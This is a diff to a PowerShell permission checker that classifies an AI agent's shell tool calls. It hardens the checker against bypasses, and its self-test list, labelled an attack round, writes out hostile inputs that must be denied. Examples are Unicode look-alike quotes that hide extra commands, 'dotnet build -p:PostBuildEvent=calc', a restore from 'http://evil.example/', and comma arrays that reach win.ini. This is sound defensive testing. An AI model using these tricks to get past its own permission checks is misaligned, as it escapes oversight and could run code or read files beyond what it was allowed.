@@ -2739,6 +2739,9 @@ function Find-ReviewParen([string]$Text, [int]$Open) {
 }
 function Test-ReviewPathArg([string]$Value, $Ctx) {
     if (-not $Value -or $Value.Contains('@SUB@') -or $Value.Contains('$') -or $Value.Contains('"') -or $Value.Contains("'")) { return $false }
+    # A comma makes an array of paths (`a,\Windows\win.ini`); a device name (CON, NUL, COM1 ..., with or without an extension) is not a file.
+    if ($Value.Contains(',')) { return $false }
+    foreach ($seg in ($Value -split '[\\/]')) { if ($seg.Split('.')[0].Trim() -imatch '^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$') { return $false } }
     if ([IO.Path]::IsPathRooted($Value)) {
         if (Test-DialogBundlePath $Value $Ctx.BundleRoot $Ctx.ScratchRoot -AllowRoot) { return $true }
         if (-not $Ctx.TargetRoot -or $Value.Contains('..') -or $Value.Contains('~')) { return $false }
@@ -2783,11 +2786,22 @@ function Test-ReviewSegment([string]$Segment, $Ctx) {
     if ($name -ceq 'git') { return Test-ReviewGitSegment $tokens $Ctx }
     if ($name -ceq 'dotnet') {
         if ($tokens.Count -lt 2 -or $tokens[1].ToLowerInvariant() -notin @('build', 'test', 'restore')) { return $false }
-        return -not @($tokens | Where-Object { $_.Contains('$') -or $_.Contains('@SUB@') -or $_.Contains('..') -or $_.Contains('~') -or [IO.Path]::IsPathRooted($_) }).Count
+        # Only a fixed argument list: MSBuild properties, loggers, output dirs, sources and targets all run or write something.
+        $files = 0
+        for ($i = 2; $i -lt $tokens.Count; $i++) {
+            $t = $tokens[$i]
+            if ($t -in @('--no-restore', '--no-build', '--nologo')) { continue }
+            if ($t -in @('-c', '--configuration')) { if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1] -cnotin @('Debug', 'Release')) { return $false }; $i++; continue }
+            if ($t -in @('-v', '--verbosity')) { if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1] -cnotin @('q', 'm', 'quiet', 'minimal')) { return $false }; $i++; continue }
+            if ($t -cmatch '^[A-Za-z0-9_][A-Za-z0-9_.\-/\\]*\.(sln|slnx|csproj)$' -and -not [IO.Path]::IsPathRooted($t) -and (Test-ReviewPathArg $t $Ctx)) { $files++; continue }
+            return $false
+        }
+        return $files -le 1
     }
     if (-not $reviewReadOnly.ContainsKey($name)) { return $false }
     $spec = $reviewReadOnly[$name]
     $positional = 0
+    $patternNamed = $tokens -contains '-pattern'
     for ($i = 1; $i -lt $tokens.Count; $i++) {
         $t = $tokens[$i]
         if ($t -cmatch '^-[A-Za-z]+$') {
@@ -2796,6 +2810,7 @@ function Test-ReviewSegment([string]$Segment, $Ctx) {
             if ($flag -in $spec.Path) { if ($i + 1 -ge $tokens.Count -or -not (Test-ReviewPathArg $tokens[$i + 1] $Ctx)) { return $false }; $i++; continue }
             if ($flag -in $spec.Value) {
                 if ($i + 1 -ge $tokens.Count -or $tokens[$i + 1].Contains('$')) { return $false }
+                if ($flag -in @('-erroraction', '-warningaction') -and $tokens[$i + 1] -cnotmatch '^(SilentlyContinue|Stop|Continue|Ignore)$') { return $false }
                 if ($spec.Algorithm -and $flag -ceq '-algorithm' -and $tokens[$i + 1] -ine $spec.Algorithm) { return $false }
                 $i++; continue
             }
@@ -2805,7 +2820,7 @@ function Test-ReviewSegment([string]$Segment, $Ctx) {
         $positional++
         switch ($spec.Positional) {
             'path' { if (-not (Test-ReviewPathArg $t $Ctx)) { return $false } }
-            'pattern-then-path' { if ($positional -gt 1 -and -not (Test-ReviewPathArg $t $Ctx)) { return $false } }
+            'pattern-then-path' { if (($positional -gt 1 -or $patternNamed) -and -not (Test-ReviewPathArg $t $Ctx)) { return $false } }
             'none' { return $false }
         }
     }
@@ -2831,6 +2846,7 @@ function Test-ReviewChain([string]$Text, $Ctx, [int]$Depth) {
         switch -CaseSensitive ($c) {
             { $_ -ceq '"' -or $_ -ceq "'" } { $quote = $c; [void]$sb.Append($c); $i++ }
             { $_ -in @('{', '}', '<', ')') } { return $false }
+            '@' { if ($i + 1 -lt $n -and $Text[$i + 1] -match '[A-Za-z_]') { return $false }; [void]$sb.Append($c); $i++ }  # splatting (@PROFILE)
             '>' {
                 if ($Text.Substring($i).StartsWith('>&1') -and $sb.Length -gt 0 -and $sb[$sb.Length - 1] -ceq '2' -and ($sb.Length -eq 1 -or [char]::IsWhiteSpace($sb[$sb.Length - 2]))) { [void]$sb.Remove($sb.Length - 1, 1); $i += 3 } else { return $false }
             }
@@ -2847,6 +2863,8 @@ function Test-ReviewChain([string]$Text, $Ctx, [int]$Depth) {
     return $true
 }
 function Get-ReviewPermissionClass($Request, [string]$BundleRoot, [string]$ScratchRoot, [string]$TargetRoot) {
+    # PowerShell reads U+2018-U+201E as quotes and U+2013-U+2015 as a dash; any character outside printable ASCII (tab, CR, LF aside) is refused.
+    if ([string]$Request.tool_name -in @('PowerShell', 'Bash') -and [string]$Request.input.command -cmatch '[^\x20-\x7E\t\r\n]') { return 'none' }
     $class = Get-ReviewPermissionClassSingle $Request $BundleRoot $ScratchRoot
     if ($class -ne 'none' -or -not $BundleRoot -or [string]$Request.tool_name -ne 'PowerShell') { return $class }
     $ctx = @{ BundleRoot = $BundleRoot; ScratchRoot = $ScratchRoot; TargetRoot = $TargetRoot; Script = $false }
@@ -7748,6 +7766,30 @@ function Invoke-ReviewPermissionSelfTest {
         @('PowerShell', 'git config user.name x', 'denied', 'git config'),
         @('PowerShell', 'git log | Out-File x.txt', 'denied', 'git into Out-File'),
         @('PowerShell', 'dotnet publish | Select -Last 3', 'denied', 'dotnet publish'),
+        # H7 attack round: look-alike quotes, dotnet arguments, comma arrays, a named -Pattern, splatting, -ErrorAction Inquire, device names.
+        @('PowerShell', ('Write-Output ''a' + [char]0x2018 + ' ; Get-Content x ; ' + [char]0x2018 + 'b'''), 'denied', 'item 1: a U+2018 quote look-alike (the quote tracking would see the middle as outside)'),
+        @('PowerShell', ('Write-Output "a' + [char]0x201C + ' ; Get-Content x ; ' + [char]0x201C + 'b"'), 'denied', 'item 1: a U+201C quote look-alike'),
+        @('PowerShell', ('Get-Content ' + [char]0x2013 + 'Path x'), 'denied', 'item 1: an en dash for the parameter dash'),
+        @('PowerShell', 'dotnet build -p:PostBuildEvent=calc', 'denied', 'item 2: dotnet build -p: PostBuildEvent'),
+        @('PowerShell', 'dotnet build -bl:C:\out\x.binlog', 'denied', 'item 2: dotnet build -bl: binary log'),
+        @('PowerShell', 'dotnet build -p:OutDir=C:\out\', 'denied', 'item 2: dotnet build -p:OutDir'),
+        @('PowerShell', "dotnet test --logger 'trx;LogFileName=C:\out\x.trx'", 'denied', 'item 2: dotnet test --logger'),
+        @('PowerShell', 'dotnet build -flp:logfile=C:\out\x.log', 'denied', 'item 2: dotnet build -flp'),
+        @('PowerShell', 'dotnet build -p:BaseIntermediateOutputPath=C:\out\', 'denied', 'item 2: dotnet build -p:BaseIntermediateOutputPath'),
+        @('PowerShell', 'dotnet build -t:Exec', 'denied', 'item 2: dotnet build -t:'),
+        @('PowerShell', 'dotnet restore --source http://evil.example/', 'denied', 'item 2: dotnet restore --source'),
+        @('PowerShell', 'dotnet build', 'allowed', 'item 2: a plain dotnet build'),
+        @('PowerShell', 'dotnet build Orders.sln --no-restore -c Release -v q --nologo', 'allowed', 'item 2: dotnet build with the fixed argument list'),
+        @('PowerShell', 'Get-Content a,\Windows\win.ini', 'denied', 'item 3: a comma array whose second path is outside'),
+        @('PowerShell', 'Get-ChildItem a,\Windows', 'denied', 'item 3: Get-ChildItem comma array'),
+        @('PowerShell', 'Select-String -Pattern x C:\Windows\win.ini', 'denied', 'item 4: a named -Pattern leaves a bare path outside'),
+        @('PowerShell', 'Select-String -Pattern x src/Orders.Api/a.cs', 'allowed', 'item 4: a named -Pattern with a target path'),
+        @('PowerShell', 'Get-Content @PROFILE', 'denied', 'item 5: splatting'),
+        @('PowerShell', "Get-Content `"$m`" -ErrorAction Inquire", 'denied', 'item 6: -ErrorAction Inquire'),
+        @('PowerShell', "Get-Content `"$m`" -ErrorAction SilentlyContinue", 'allowed', 'item 6: -ErrorAction SilentlyContinue'),
+        @('PowerShell', 'Get-Content NUL', 'denied', 'item 7: the NUL device'),
+        @('PowerShell', 'Get-Content CON.txt', 'denied', 'item 7: the CON device with an extension'),
+        @('PowerShell', "Get-Content `"$bundle\com1`"", 'denied', 'item 7: a COM1 device under the bundle root'),
         @('Bash', "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash", 'denied', 'the pipe through the Bash tool'),
         @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash", 'denied-off', 'the opt-in off')
     )
